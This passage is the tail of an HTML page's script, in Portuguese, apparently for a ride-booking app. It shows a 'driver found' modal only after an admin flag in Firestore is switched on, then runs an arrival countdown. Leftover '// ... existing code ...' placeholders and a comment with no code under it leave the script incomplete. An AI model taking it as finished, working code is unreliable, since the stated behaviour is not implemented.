          if (window._aguardandoMotoristaTimeout) clearTimeout(window._aguardandoMotoristaTimeout);
          // Buscar dados do painel admin
          db.collection('painel').doc('admin').get().then((doc) => {
            if (doc.exists) {
              const data = doc.data();
              if (data.liberarMotorista) {
                window._aguardandoMotoristaTimeout = setTimeout(() => {
                  // Checar novamente se liberarMotorista ainda está ativado
                  db.collection('painel').doc('admin').get().then((doc2) => {
                    if (doc2.exists && doc2.data().liberarMotorista) {
                      document.getElementById('carregandoMotoristaModal').style.display = 'none';
                      exibirModalMotorista(doc2.data());
                    }
                  });
                }, 10000);
              }
            }
          });
        }

        // Função para iniciar o contador regressivo no modal do motorista encontrado
        function iniciarContadorMotorista(minutos) {
          console.log('[DEBUG] iniciarContadorMotorista chamada', minutos);
          if (isNaN(minutos) || minutos <= 0) minutos = 30;
          let segundos = minutos * 60;
          const tempoDiv = document.getElementById('tempo-motorista-encontrado');
          function atualizarTempo() {
            if (segundos > 0) {
              const min = Math.floor(segundos / 60);
              const seg = segundos % 60;
              tempoDiv.innerHTML = `Chega em aproximadamente <b>${min}m ${seg < 10 ? '0' : ''}${seg}s</b>`;
              segundos--;
              window._contadorMotorista = setTimeout(atualizarTempo, 1000);
            } else {
              tempoDiv.innerHTML = '<b>Motorista chegou</b>';
              console.log('[DEBUG] Motorista chegou!');
            }
          }
          atualizarTempo();
        }

        // ... existing code ...
        // Ao exibir o modal do motorista encontrado, iniciar o contador
     
        // ... existing code ...
    </script>

    <!-- SISTEMA DE PROTEÇÃO - GARANTIA 100% DE FUNCIONALIDADE -->
    <script src="protection.js"></script>
</body>
</html> 